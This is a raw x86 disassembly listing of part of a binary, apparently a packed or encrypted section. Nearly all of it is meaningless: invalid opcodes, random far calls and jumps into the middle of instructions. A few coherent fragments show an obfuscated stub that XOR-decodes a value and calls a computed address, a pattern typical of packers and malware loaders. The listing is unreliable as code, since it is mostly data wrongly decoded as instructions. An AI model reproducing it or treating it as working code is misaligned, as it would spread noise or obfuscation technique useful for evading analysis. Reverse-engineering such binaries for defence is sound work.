  415ff0:	loope  0x416012
  415ff2:	mov    esi,0x753a0bfa
  415ff7:	xor    DWORD PTR [edx+eiz*8+0x7e],0x8c3f1160
  415fff:	lods   al,BYTE PTR ds:[esi]
  416000:	lods   al,BYTE PTR ds:[esi]
  416001:	adc    al,0xe4
  416003:	in     eax,dx
  416004:	(bad)  
  416006:	jmp    0x41603f
  416008:	sub    bh,cl
  41600a:	jo     0x416059
  41600c:	ffreep st(3)
  41600e:	and    al,BYTE PTR [ecx+eiz*8]
  416011:	adc    DWORD PTR [ebx-0x3],0xca44381d
  416018:	mov    eax,0xe9f47b7a
  41601d:	pushf  
  41601e:	(bad)  
  41601f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416020:	test   BYTE PTR [edx-0x17437ed4],bh
  416026:	clc    
  416027:	(bad)  
  416029:	adc    bl,bh
  41602b:	sub    dh,BYTE PTR ds:0x900a8c5
  416031:	aad    0x4d
  416033:	ret    
  416034:	pop    edi
  416035:	push   ds
  416036:	call   0x8c88:0xef081856
  41603d:	pop    ecx
  41603e:	push   ss
  41603f:	push   cs
  416040:	and    cl,ah
  416042:	fimul  WORD PTR [ecx+0x72]
  416045:	icebp  
  416046:	mov    ds:0xb38c36fc,al
  41604b:	shr    BYTE PTR [edi-0x2e],cl
  41604e:	out    0xd8,eax
  416050:	dec    edi
  416051:	xchg   ebx,eax
  416052:	shr    DWORD PTR [edi+0x2f],0xb6
  416056:	and    dh,cl
  416058:	lahf   
  416059:	ins    DWORD PTR es:[edi],dx
  41605a:	push   0xa09ccf2a
  41605f:	xor    BYTE PTR [edi+edi*1-0x18],bl
  416063:	inc    ecx
  416064:	rcr    DWORD PTR [esp+ebx*2-0x75],1
  416068:	push   ebp
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160c1
  41609a:	das    
  41609b:	mov    ds:0x7f17cac1,eax
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416026
  4160a6:	int    0x51
  4160a8:	inc    ecx
  4160a9:	test   eax,0xc0cf7b3c
  4160ae:	add    ebp,DWORD PTR [eax+0x21e5435]
  4160b4:	mov    ebp,0xf62e2572
  4160b9:	sub    eax,0xfb52819d
  4160be:	dec    ecx
  4160bf:	inc    edx
  4160c0:	call   0xd001:0x3b4d8ac0
  4160c7:	pop    ecx
  4160c8:	inc    ecx
  4160c9:	xchg   ebx,eax
  4160ca:	dec    edi
  4160cb:	xchg   esp,eax
  4160cc:	mov    ds:0x7ad754b,al
  4160d1:	mov    BYTE PTR fs:[ecx-0x5ca293f1],bh
  4160d8:	and    esi,DWORD PTR [eax-0x5f11e230]
  4160de:	int    0xdb
  4160e0:	js     0x41612b
  4160e2:	pop    ecx
  4160e3:	sub    ebx,DWORD PTR [esi+0x54dba6cf]
  4160e9:	pop    ebx
  4160ea:	xchg   esp,eax
  4160eb:	jb     0x416071
  4160ed:	push   edx
  4160ee:	sbb    BYTE PTR [edi-0x28],dh
  4160f1:	imul   esp,DWORD PTR [esi+0x22535db2],0x68
  4160f8:	sub    eax,DWORD PTR [esi+0x9]
  4160fb:	arpl   WORD PTR [edx-0x75],dx
  4160fe:	test   eax,0x32955d68
  416103:	clc    
  416104:	mov    cl,0x3a
  416106:	mov    bh,0xdf
  416108:	popa   
  416109:	jecxz  0x4160a7
  41610b:	mov    dl,0xbe
  41610d:	cmp    eax,0xafb143f5
  416112:	push   esi
  416113:	add    al,0x77
  416115:	pop    ss
  416116:	fisubr WORD PTR [ebp+0x1f]
  416119:	sti    
  41611a:	jb     0x416157
  41611c:	test   al,0x43
  41611e:	adc    BYTE PTR [esi-0x47],dl
  416121:	pop    es
  416122:	outs   dx,BYTE PTR ds:[esi]
  416123:	data16 jo 0x4160c9
  416126:	xlat   BYTE PTR ds:[ebx]
  416127:	int    0xae
  416129:	jnp    0x416142
  41612b:	pop    ds
  41612c:	int    0xd9
  41612e:	inc    edi
  41612f:	mul    BYTE PTR [edi+0x73bb6523]
  416135:	dec    eax
  416136:	mov    DWORD PTR [ebp-0x6ebce047],esp
  41613c:	test   al,0x80
  41613e:	adc    dh,BYTE PTR [esi-0x36]
  416141:	neg    DWORD PTR [ebx]
  416143:	sub    cl,BYTE PTR [ecx]
  416145:	xchg   DWORD PTR [ebx],esp
  416147:	fsubrp st(3),st
  416149:	mov    al,ds:0xde7cd5aa
  41614e:	push   eax
  41614f:	test   eax,0x96f7240d
  416154:	(bad)  [eax]
  416156:	int    0xa4
  416158:	(bad)  
  416159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41615a:	mov    esp,0xdca6061c
  41615f:	lds    edx,FWORD PTR [ebp+0x5e]
  416162:	push   0xffffff88
  416164:	repnz pop ss
  416166:	lahf   
  416167:	mov    ebp,0xd7659d7c
  41616c:	(bad)  
  41616d:	and    eax,ecx
  41616f:	loop   0x41615c
  416171:	xchg   DWORD PTR [ebx],esi
  416173:	das    
  416174:	popf   
  416175:	cmp    BYTE PTR [ecx],ah
  416177:	mov    al,ds:0x571d24fa
  41617c:	xchg   ebp,eax
  41617d:	pop    esp
  41617e:	sub    eax,0x1cd5b01b
  416183:	adc    bl,BYTE PTR [ebp-0x77]
  416186:	mov    dh,0xc
  416188:	shl    DWORD PTR [edx+0x76],1
  41618b:	(bad)  
  41618c:	out    0xf1,al
  41618e:	xor    bl,bl
  416190:	stc    
  416191:	or     ah,BYTE PTR [eax+0x30]
  416194:	aam    0x72
  416196:	into   
  416197:	sbb    al,0xc7
  416199:	xchg   ebp,eax
  41619a:	lea    ecx,ds:0xb4d5df03
  4161a0:	push   es
  4161a1:	(bad)  
  4161a2:	cmp    bl,cl
  4161a4:	pop    ds
  4161a5:	push   ebp
  4161a6:	hlt    
  4161a7:	loop   0x416163
  4161a9:	lods   eax,DWORD PTR ds:[esi]
  4161aa:	push   edi
  4161ab:	cmc    
  4161ac:	xor    ecx,DWORD PTR [edi*2+0x3df9198c]
  4161b3:	jnp    0x4161ef
  4161b5:	(bad)  
  4161b6:	fnop   
  4161b8:	mov    ebx,0x4b81e5c0
  4161bd:	push   edx
  4161be:	mov    esp,0x96bfeaf8
  4161c3:	inc    esp
  4161c4:	imul   esp,DWORD PTR [eax],0x43f5cf23
  4161ca:	fcomp  QWORD PTR [esi-0x65731ebc]
  4161d0:	mov    ebx,0xf8edbae
  4161d5:	icebp  
  4161d6:	add    ebx,DWORD PTR [edx+0x6]
  4161d9:	shr    BYTE PTR ds:0x5798ca9d,cl
  4161df:	loopne 0x41625a
  4161e1:	jp     0x4161e6
  4161e3:	out    dx,al
  4161e4:	xchg   esi,eax
  4161e5:	mov    ah,bh
  4161e7:	jno    0x41625e
  4161e9:	in     eax,0x5b
  4161eb:	sbb    edi,ecx
  4161ed:	pop    esi
  4161ee:	pop    eax
  4161ef:	xor    al,0x5e
  4161f1:	test   DWORD PTR [ecx-0x60],edx
  4161f4:	inc    esi
  4161f5:	sub    edx,DWORD PTR [edx-0x45]
  4161f8:	std    
  4161f9:	js     0x41624b
  4161fb:	and    al,0xec
  4161fd:	out    0x4b,al
  4161ff:	xchg   esi,eax
  416200:	(bad)  
  416201:	jge    0x41621f
  416203:	or     DWORD PTR [edx-0x7c327a91],eax
  416209:	xchg   edx,eax
  41620a:	pop    edx
  41620b:	int3   
  41620c:	aam    0x96
  41620e:	hlt    
  41620f:	cwde   
  416210:	fst    QWORD PTR [ecx+0x2218e530]
  416216:	loopne 0x416257
  416218:	jo     0x416248
  41621a:	out    0x23,al
  41621c:	mov    fs,WORD PTR [ebx-0x5db60e49]
  416222:	ss cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416225:	xchg   ebx,eax
  416226:	fstp   st(6)
  416228:	sbb    eax,0x2bc6f7a9
  41622d:	cli    
  41622e:	ficomp DWORD PTR [ebp+0xd]
  416231:	sub    al,0xe4
  416233:	push   esp
  416234:	mov    dh,BYTE PTR [edx]
  416236:	push   es
  416237:	test   al,0xb8
  416239:	dec    ebx
  41623a:	inc    eax
  41623b:	aad    0xc1
  41623d:	or     al,0xc0
  41623f:	xchg   ebp,eax
  416240:	imul   edx,DWORD PTR [esp+ecx*8+0x6a],0xffffffef
  416245:	dec    edi
  416246:	or     eax,0x67516488
  41624b:	inc    ecx
  41624c:	mov    dl,0x5d
  41624e:	std    
  41624f:	sbb    edx,DWORD PTR [edi+0x751c2060]
  416255:	loop   0x4161f6
  416257:	jle    0x416261
  416259:	lea    edx,[edx]
  41625b:	sub    al,BYTE PTR [ecx-0x2ea381da]
  416261:	xchg   edx,eax
  416262:	pop    esi
  416263:	push   ds
  416264:	sbb    al,0x8
  416266:	pop    esp
  416267:	stc    
  416268:	pusha  
  416269:	adc    edx,DWORD PTR [esi+0x440ed4b3]
  41626f:	retf   0x3abf
  416272:	leave  
  416273:	scas   al,BYTE PTR es:[edi]
  416274:	or     DWORD PTR [eax+esi*4-0x4558b50a],eax
  41627b:	pop    ss
  41627c:	outs   dx,BYTE PTR ds:[esi]
  41627d:	call   0x5a489480
  416282:	and    DWORD PTR [ecx],0xb180d7f
  416288:	jmp    0x416242
  41628a:	daa    
  41628b:	jno    0x416250
  41628d:	jmp    0x4162a1
  41628f:	xchg   edx,eax
  416290:	pop    ecx
  416291:	test   DWORD PTR [ebx-0x35f045eb],edi
  416297:	cwde   
  416298:	inc    esp
  416299:	sub    esp,DWORD PTR [ebx-0x62]
  41629c:	push   ebx
  41629d:	xchg   ebx,eax
  41629e:	or     BYTE PTR [ecx+ecx*1],al
  4162a1:	pop    edx
  4162a2:	push   ebx
  4162a3:	xor    ch,BYTE PTR [ecx-0x71f88310]
  4162a9:	xlat   BYTE PTR ds:[ebx]
  4162aa:	push   esi
  4162ab:	in     al,0x50
  4162ad:	sar    BYTE PTR ds:0x51ba41c0,cl
  4162b3:	fst    QWORD PTR [ebp+0x1c]
  4162b6:	in     al,dx
  4162b7:	inc    edi
  4162b8:	data16 js 0x4162bb
  4162bb:	(bad)  
  4162bd:	xor    bh,BYTE PTR [edi-0x50]
  4162c0:	pop    ecx
  4162c1:	mov    BYTE PTR [eax],bh
  4162c3:	test   al,0xe2
  4162c5:	loope  0x41624e
  4162c7:	xchg   esp,eax
  4162c8:	jecxz  0x416305
  4162ca:	pusha  
  4162cb:	adc    dl,BYTE PTR [eax]
  4162cd:	push   ecx
  4162ce:	les    esi,FWORD PTR [edi+0x78399567]
  4162d4:	fisttp DWORD PTR [edi]
  4162d6:	(bad)  
  4162d7:	mov    bl,0x8d
  4162d9:	jl     0x416273
  4162db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162dc:	pusha  
  4162dd:	std    
  4162de:	adc    DWORD PTR [ebx-0x7e],esp
  4162e1:	fcompp 
  4162e3:	nop
  4162e4:	sbb    eax,0x5dc53934
  4162e9:	(bad)  
  4162ea:	(bad)  
  4162eb:	jecxz  0x4162e2
  4162ed:	(bad)  
  4162ef:	jae    0x416325
  4162f1:	in     eax,0x88
  4162f3:	inc    ebp
  4162f4:	mov    esp,0xb5d72ba8
  4162f9:	pop    esi
  4162fa:	or     BYTE PTR [ebx+0x27],bl
  4162fd:	pop    ecx
  4162fe:	mov    ds:0x11a7bcd7,eax
  416303:	idiv   BYTE PTR [ebp-0x6cc24647]
  416309:	lock inc edi
  41630b:	sar    BYTE PTR [esi],1
  41630d:	loop   0x41631c
  41630f:	add    DWORD PTR [edx+0x74ee1691],0x442d2c4e
  416319:	aas    
  41631a:	outs   dx,DWORD PTR ds:[esi]
  41631b:	lea    ebx,ds:0x20602494
  416321:	aaa    
  416322:	aas    
  416323:	sbb    al,0xb1
  416325:	cmp    BYTE PTR [edx+0x3a],ah
  416328:	std    
  416329:	cmp    edx,DWORD PTR [edx-0x12]
  41632c:	xor    ch,BYTE PTR [ebp+0x63]
  41632f:	fwait
  416330:	xchg   esi,eax
  416331:	outs   dx,BYTE PTR ds:[esi]
  416332:	test   DWORD PTR [esi],esp
  416334:	pop    esi
  416335:	sbb    eax,0x69720356
  41633a:	addr16 cwde 
  41633c:	scas   al,BYTE PTR es:[edi]
  41633d:	addr16 xchg ebp,eax
  41633f:	scas   al,BYTE PTR es:[edi]
  416340:	pop    eax
  416341:	xchg   DWORD PTR [eax-0x27a443ca],ecx
  416347:	data16 ror BYTE PTR [edi+0x33562100],1
  41634e:	inc    ebp
  41634f:	pop    ebx
  416350:	jns    0x41631c
  416352:	(bad)  
  416354:	push   esi
  416355:	inc    esi
  416356:	xchg   ah,al
  416358:	adc    al,0xbe
  41635a:	mov    edi,0x5cfe6adc
  41635f:	lock mov BYTE PTR [edx+edx*2+0x4e],bl
  416364:	dec    ecx
  416365:	ins    BYTE PTR es:[edi],dx
  416366:	lods   eax,DWORD PTR ds:[esi]
  416367:	outs   dx,DWORD PTR ds:[esi]
  416368:	cli    
  416369:	jle    0x4163df
  41636b:	or     BYTE PTR [ebx-0x7372f7b3],0xa
  416372:	pushf  
  416373:	jb     0x4163a7
  416375:	add    BYTE PTR [ebx],bh
  416377:	enter  0x850f,0x22
  41637b:	icebp  
  41637c:	(bad)  
  41637d:	dec    DWORD PTR [ebx+0x5e9de]
  416383:	add    BYTE PTR [eax],al
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x654dc841
  4163bf:	sub    esp,DWORD PTR [eax+0x707f1413]
  4163c5:	mov    ecx,0x9a70707e
  4163ca:	jge    0x416358
  4163cc:	mov    al,0x27
  4163ce:	sub    bh,ch
  4163d0:	adc    BYTE PTR [esi],dh
  4163d2:	out    0xe8,al
  4163d4:	mov    esp,0x3112052a
  4163d9:	push   ss
  4163da:	mov    edi,0xca5f6a41
  4163df:	lods   eax,DWORD PTR ds:[esi]
  4163e0:	je     0x4163bd
  4163e2:	jmp    0x72f6:0xeec3af1b
  4163e9:	aam    0xca
  4163eb:	in     eax,dx
  4163ec:	(bad)  
  4163ed:	scas   al,BYTE PTR es:[edi]
  4163ee:	push   esp
  4163ef:	mov    edi,0x298a84d0
  4163f4:	add    ch,BYTE PTR [eax]
  4163f6:	or     DWORD PTR [ebx-0x57d88f1e],ecx
  4163fc:	sub    al,0x2a
  4163fe:	nop
  4163ff:	sub    dh,BYTE PTR [eax-0x65]
  416402:	xor    eax,0xac076f03
  416407:	sbb    ebp,DWORD PTR [ecx+0x3a]
  41640a:	pop    es
  41640b:	stos   DWORD PTR es:[edi],eax
  41640c:	(bad)  
  41640d:	push   cs
  41640e:	sub    al,0xb3
  416410:	inc    esi
  416411:	stc    
  416412:	stos   BYTE PTR es:[edi],al
  416413:	in     al,dx
  416414:	cdq    
  416415:	add    eax,0x5b069a8d
  41641a:	sub    al,0x48
  41641c:	cmp    al,0xb9
  41641e:	retf   0xa3dc
  416421:	cli    
  416422:	das    
  416423:	rcr    DWORD PTR [ecx-0x72],cl
  416426:	fidiv  DWORD PTR [edx]
  416428:	mov    al,ds:0xf88393d
  41642d:	fwait
  41642e:	in     al,dx
  41642f:	repz sbb al,0x85
  416432:	lahf   
  416433:	push   eax
  416434:	out    dx,al
  416435:	test   al,0x73
  416437:	imul   eax,DWORD PTR [esi],0xff6d232d
  41643d:	das    
  41643e:	repz aam 0xed
  416441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416442:	imul   ebx,esi,0xffffffff
  416445:	int3   
  416446:	shl    DWORD PTR [ebp+0x36e71b50],1
  41644c:	xchg   ecx,eax
  41644d:	push   0xffffffa2
  41644f:	adc    al,0xe1
  416451:	add    bh,BYTE PTR es:[edx-0x37]
  416455:	pop    esi
  416456:	daa    
  416457:	out    0x33,al
  416459:	adc    edi,DWORD PTR [ebx]
  41645b:	das    
  41645c:	or     esi,ebx
  41645e:	xor    al,0xb1
  416460:	and    eax,0x77bf6972
  416465:	push   cs
  416466:	bound  esp,QWORD PTR [eax-0x1e]
  416469:	mov    edi,0x4136fec0
  41646e:	mov    DWORD PTR [ebp+0x7f],ecx
  416471:	cmp    al,0x50
  416473:	je     0x41648a
  416475:	or     ch,BYTE PTR [ecx+eax*8]
  416478:	xor    esi,DWORD PTR ds:0x7102bb6c
  41647e:	mov    bl,0xb0
  416480:	stos   DWORD PTR es:[edi],eax
  416481:	inc    edi
  416482:	lods   eax,DWORD PTR ds:[esi]
  416483:	pop    es
  416484:	add    bh,ah
  416486:	xor    DWORD PTR [ecx*4-0x14d96b0a],0xffffffda
  41648e:	leave  
  41648f:	xlat   BYTE PTR ds:[ebx]
  416490:	lock mov esi,0xea47b77b
  416496:	mov    bh,0xd1
  416498:	lahf   
  416499:	pop    es
  41649a:	jae    0x416491
  41649c:	and    al,0x2
  41649e:	add    DWORD PTR [ecx],ecx
  4164a0:	pop    ds
  4164a1:	fisub  WORD PTR [edi+0x141e795d]
  4164a7:	cmp    esi,esp
  4164a9:	add    cl,ch
  4164ab:	or     eax,0x45d94571
  4164b0:	mov    dl,0x79
  4164b2:	xchg   ebp,eax
  4164b3:	push   edx
  4164b4:	inc    esi
  4164b5:	fs (bad) 
  4164b7:	jmp    0x416477
  4164b9:	cmp    bl,ch
  4164bb:	jne    0x416488
  4164bd:	loop   0x41653b
  4164bf:	sbb    ecx,ebx
  4164c1:	pop    ss
  4164c2:	imul   ebp,DWORD PTR ds:0x864b3511,0xffffffde
  4164c9:	fmul   QWORD PTR [ebp-0x28a43850]
  4164cf:	inc    ecx
  4164d0:	inc    edi
  4164d1:	push   cs
  4164d2:	jmp    0xde51:0x2fc125d0
  4164d9:	ret    
  4164da:	mov    ebp,0xc84af4f8
  4164df:	and    dl,ch
  4164e1:	push   eax
  4164e2:	or     edx,DWORD PTR [ebx]
  4164e4:	add    al,0x83
  4164e6:	add    esi,DWORD PTR [ecx+0x72]
  4164e9:	or     edx,ebp
  4164eb:	jbe    0x4164e7
  4164ed:	jbe    0x4164ae
  4164ef:	mov    cl,0x5b
  4164f1:	mov    cl,BYTE PTR [edi+esi*8+0x69d90e08]
  4164f8:	hlt    
  4164f9:	sti    
  4164fa:	adc    al,0x5
  4164fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164fd:	test   eax,0x1cc4b776
  416502:	lods   eax,DWORD PTR ds:[esi]
  416503:	stos   DWORD PTR es:[edi],eax
  416504:	in     eax,dx
  416505:	es cs pop ecx
  416508:	pop    edi
  416509:	not    DWORD PTR [eax-0x3c]
  41650c:	mov    edi,0x7df225df
  416511:	in     al,0xb0
  416513:	leave  
  416514:	ror    DWORD PTR [ebx+ebx*1+0x18db1d54],cl
  41651b:	mov    eax,ds:0xd9f15a50
  416520:	mov    dh,0xe2
  416522:	mov    ?,WORD PTR [esi-0x2c16de8f]
  416528:	repnz dec ecx
  41652a:	popf   
  41652b:	sti    
  41652c:	add    BYTE PTR [edi-0xb],dh
  41652f:	jno    0x41652f
  416531:	sub    edi,DWORD PTR [eax-0x796199c8]
  416537:	adc    al,0xef
  416539:	mov    DWORD PTR [ecx+0x4f],esp
  41653c:	jb     0x4164e2
  41653e:	adc    ebx,esi
  416540:	fisubr DWORD PTR [esp+ebp*1+0x6d]
  416544:	int3   
  416545:	push   cs
  416546:	cmc    
  416547:	iret   
  416548:	sbb    DWORD PTR [ebp+0x11e6ea41],edx
  41654e:	ds retf 0xe959
  416552:	jle    0x416561
  416554:	dec    ebx
  416555:	xor    dh,BYTE PTR [ecx+ebp*4-0x1d]
  416559:	mov    esp,0xe91ef858
  41655e:	call   FWORD PTR [ebx+0xa]
  416561:	(bad)  
  416562:	arpl   cx,cx
  416564:	jne    0x4165df
  416566:	or     edi,DWORD PTR [edi+edx*4+0x3b817b5b]
  41656d:	stc    
  41656e:	imul   ebx,DWORD PTR [eax+ebp*8+0x5b],0x13
  416573:	pop    ds
  416574:	addr16 push es
  416576:	jns    0x416541
  416578:	and    eax,0x759fb4c2
  41657d:	dec    ebp
  41657e:	and    eax,0x60bafa9f
  416583:	lods   al,BYTE PTR gs:[esi]
  416585:	jne    0x4165bb
  416587:	dec    BYTE PTR [esp+ecx*4+0x2d23f283]
  41658e:	jo     0x4165f6
  416590:	and    edi,DWORD PTR [edi+0x22]
  416593:	lea    ebp,[edi+edx*2]
  416596:	push   edi
  416597:	mov    ch,0x2b
  416599:	dec    ebx
  41659a:	mov    ah,0x76
  41659c:	push   0x22
  41659e:	push   0xe559ff50
  4165a3:	fwait
  4165a4:	das    
  4165a5:	test   BYTE PTR [ecx],bl
  4165a7:	jb     0x416577
  4165a9:	fisubr DWORD PTR [ebp+0xa]
  4165ac:	call   0x7316:0xdfe662a8
  4165b3:	sbb    edx,DWORD PTR [eiz*1-0x4feb358c]
  4165ba:	push   edi
  4165bb:	adc    dh,dl
  4165bd:	jne    0x41656b
  4165bf:	xor    al,BYTE PTR [eax-0x21]
  4165c2:	imul   BYTE PTR [ebx]
  4165c4:	repnz jecxz 0x416596
  4165c7:	mov    esp,0xd15e9d32
  4165cc:	stc    
  4165cd:	ret    0xa036
  4165d0:	pop    ds
  4165d1:	in     eax,dx
  4165d2:	jnp    0x416582
  4165d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165d5:	push   esi
  4165d6:	xchg   ecx,eax
  4165d7:	nop
  4165d8:	sub    BYTE PTR [ebp-0x54],0x42
  4165dc:	jbe    0x41656f
  4165de:	nop
  4165df:	(bad)  
  4165e0:	loopne 0x4165db
  4165e2:	ss popf 
  4165e4:	(bad)  
  4165e5:	stc    
  4165e6:	mov    bl,BYTE PTR [eax]
  4165e8:	fild   DWORD PTR [edx]
  4165ea:	xor    eax,0xa488cec0
  4165ef:	push   ecx
  4165f0:	push   0x5bcaaa7
  4165f5:	shl    DWORD PTR [edi+0x64],0x7d
  4165f9:	xor    eax,0x8128a5e5
  4165fe:	cli    
  4165ff:	scas   al,BYTE PTR es:[edi]
  416600:	cdq    
  416601:	and    dl,BYTE PTR [edx+0x4e]
  416604:	fdiv   DWORD PTR [esi+0x43]
  416607:	sbb    BYTE PTR [ebx+0x2f],0xb
  41660b:	in     eax,dx
  41660c:	fisub  DWORD PTR [edi-0x3b]
  41660f:	mov    ch,ch
  416611:	xchg   edi,eax
  416612:	adc    al,0xc6
  416614:	dec    eax
  416615:	ret    0x21cd
  416618:	mov    bl,0xf8
  41661a:	add    dh,BYTE PTR [esi]
  41661c:	jne    0x4165e7
  41661e:	adc    BYTE PTR [ebx],cl
  416620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416621:	imul   esi,DWORD PTR [ebp-0x3b],0x9
  416625:	repnz xor ecx,DWORD PTR [esi]
  416628:	push   ebp
  416629:	fld    QWORD PTR [esi]
  41662b:	xor    DWORD PTR [eax-0x6b],ecx
  41662e:	lahf   
  41662f:	sbb    BYTE PTR [esi+0xf],dh
  416632:	mov    ebx,0x3d87bb0
  416637:	dec    edx
  416638:	mov    bh,0x96
  41663a:	sub    BYTE PTR [ebx+ecx*2],cl
  41663d:	popa   
  41663e:	xchg   ebp,eax
  41663f:	dec    BYTE PTR [eax-0x4f]
  416642:	mov    esp,DWORD PTR [esi-0xc]
  416645:	stos   DWORD PTR es:[edi],eax
  416646:	xor    eax,0x13e9da92
  41664b:	and    al,0x4e
  41664d:	mov    ch,0x51
  41664f:	push   ds
  416650:	fst    DWORD PTR [ebx+0x7f8b49eb]
  416656:	nop
  416657:	dec    ecx
  416658:	(bad)  
  41665a:	inc    edi
  41665b:	and    BYTE PTR [ecx-0x41],dl
  41665e:	pop    es
  41665f:	xchg   ebx,eax
  416660:	mov    bh,dh
  416662:	pop    ebp
  416663:	xlat   BYTE PTR ds:[ebx]
  416664:	mov    ?,WORD PTR [eax]
  416666:	add    dh,dh
  416668:	sbb    bl,BYTE PTR [esi-0x7e]
  41666b:	mov    ch,0x63
  41666d:	rcr    DWORD PTR [eax+0x48],0xfd
  416671:	and    BYTE PTR [edi+0x14b32cb4],dl
  416677:	mov    WORD PTR [eax+0x2],es
  41667a:	push   edi
  41667b:	cmc    
  41667c:	dec    edi
  41667d:	nop
  41667e:	xlat   BYTE PTR ds:[ebx]
  41667f:	inc    edx
  416680:	out    0x9a,eax
  416682:	mov    ch,0x5e
  416684:	xor    al,BYTE PTR [esi+0x3e]
  416687:	push   esp
  416688:	pop    esi
  416689:	rol    BYTE PTR [ecx],1
  41668b:	hlt    
  41668c:	jge    0x416623
  41668e:	mov    ebx,0xa6a92b9
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x4166e8
  4166ae:	sahf   
  4166af:	imul   esi,DWORD PTR [edi],0x5c
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x4170707e
  4166ba:	mov    ebp,0x4e9b169e
  4166bf:	inc    ecx
  4166c1:	mov    al,ds:0xffcc627e
  4166c6:	stos   DWORD PTR es:[edi],eax
  4166c7:	sbb    BYTE PTR [edx+0x4a839cd0],0xf2
  4166ce:	push   cs
  4166cf:	sbb    eax,0xffffff9d
  4166d2:	sbb    DWORD PTR [esi-0x5c931a34],eax
  4166d8:	loop   0x416698
  4166da:	cmc    
  4166db:	sbb    DWORD PTR [esi*1+0x3a4c2c80],ebx
  4166e2:	xor    DWORD PTR [eax],esi
  4166e4:	add    al,0xd7
  4166e6:	dec    eax
  4166e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e9:	fmul   QWORD PTR [edx]
  4166eb:	les    ebx,FWORD PTR [ecx*1+0x53c11518]
  4166f2:	sub    eax,0x45ddbcf6
  4166f7:	push   edx
  4166f9:	in     eax,0xde
  4166fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166fc:	out    0x84,eax
  4166fe:	into   
  4166ff:	xchg   esi,eax
  416700:	loop   0x41672c
  416702:	sub    ah,dh
  416704:	iret   
  416705:	jmp    0x9bbe906e
  41670a:	cmp    DWORD PTR [edx],ecx
  41670c:	fst    QWORD PTR [eax+0x9]
  41670f:	mov    ebx,cs
  416711:	stos   DWORD PTR es:[edi],eax
  416712:	call   0xe55b6b41
  416717:	xchg   esp,eax
  416718:	xor    al,0xd7
  41671a:	inc    esp
  41671b:	mov    bl,0x7c
  41671d:	and    BYTE PTR [ebx+eiz*1],ch
  416720:	mov    fs,WORD PTR [eax]
  416722:	mov    eax,ds:0x623f308e
  416727:	push   ebx
  416728:	xchg   DWORD PTR [esi-0x181144c7],esp
  41672e:	lahf   
  41672f:	xlat   BYTE PTR ds:[ebx]
  416730:	(bad)  
  416731:	int    0xe2
  416733:	dec    edx
  416734:	cmp    BYTE PTR [edx+eiz*2],bl
  416737:	push   ds
  416738:	and    DWORD PTR [esi],ecx
  41673a:	cmp    al,0xb7
  41673c:	in     eax,0xed
  41673e:	or     ebp,DWORD PTR [eax]
  416740:	sub    ah,0xf
  416743:	test   ebx,ebx
  416745:	fsub   QWORD PTR [ebx]
  416747:	or     ebx,DWORD PTR [esi-0x3492df0]
  41674d:	pop    esi
  41674e:	xor    eax,0x340449f9
  416753:	fsub   DWORD PTR [ecx+0x7e3b258b]
  416759:	test   BYTE PTR [ecx+0x40],bl
  41675c:	mov    esp,cs
  41675e:	retf   
  41675f:	pop    esp
  416760:	adc    bh,ah
  416762:	leave  
  416763:	dec    edx
  416764:	test   eax,0x7c729fb2
  416769:	in     al,0xdf
  41676b:	push   es
  41676c:	fsubr  DWORD PTR [edx-0x29]
  41676f:	inc    edx
  416770:	lods   eax,DWORD PTR ds:[esi]
  416771:	cmc    
  416772:	repnz mov cl,0x4e
  416775:	test   al,0x47
  416777:	and    bh,0x28
  41677a:	xor    eax,DWORD PTR [edi+esi*4+0x67]
  41677e:	and    BYTE PTR [edx-0x76],0xe7
  416782:	outs   dx,BYTE PTR ds:[esi]
  416783:	sbb    bl,BYTE PTR [ecx+0x28f83297]
  416789:	stos   DWORD PTR es:[edi],eax
  41678a:	(bad)  
  41678b:	cld    
  41678c:	pop    ebx
  41678d:	mov    eax,ds:0x22b41727
  416792:	inc    esp
  416793:	test   DWORD PTR [ebx+0x7f96a3c1],eax
  416799:	mov    al,0x93
  41679b:	es pop ss
  41679d:	(bad)  
  41679e:	cmp    edi,edx
  4167a0:	loop   0x41674a
